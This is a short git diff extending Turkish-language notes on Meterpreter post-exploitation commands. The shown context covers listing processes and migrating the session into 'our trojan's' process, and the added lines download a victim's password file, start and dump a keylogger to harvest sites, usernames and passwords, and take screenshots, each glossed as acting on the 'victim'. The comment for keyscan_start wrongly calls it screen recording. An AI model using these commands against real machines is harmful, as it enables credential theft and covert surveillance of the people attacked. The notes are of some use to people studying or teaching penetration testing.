@@ -13,3 +13,7 @@
 > meterpreter > help //kkurbana yapılabilecek saldırıları gösterir
 > meterpreter > ps //hedef sistemde çalışan işlemleri (process) listelemek için
 > meterpreter > migrate 2824 // mevcut Meterpreter oturumunu başka bir çalışan process içine taşır.Yani payload artık yeni process içinde çalışır. 2824 açık olan çalışan process içinde trojenimizin id numarası
+> meterpreter > download mysecretpasswords.txt // kurbanın cihazındaki dosyayı kendi cihazına indirir
+> meterpreter > keyscan_start // kurbanın ekran kaydı başlar
+> meterpreter > keyscan_dump // kurbanın ekran kaydı süresince giriş yaptığı,site,password,kullanıcı adı.. her şey çıkar
+> meterpreter > screenshot // kurbanın ekran görüntüsünü alır. /root klasörüne konumlanır
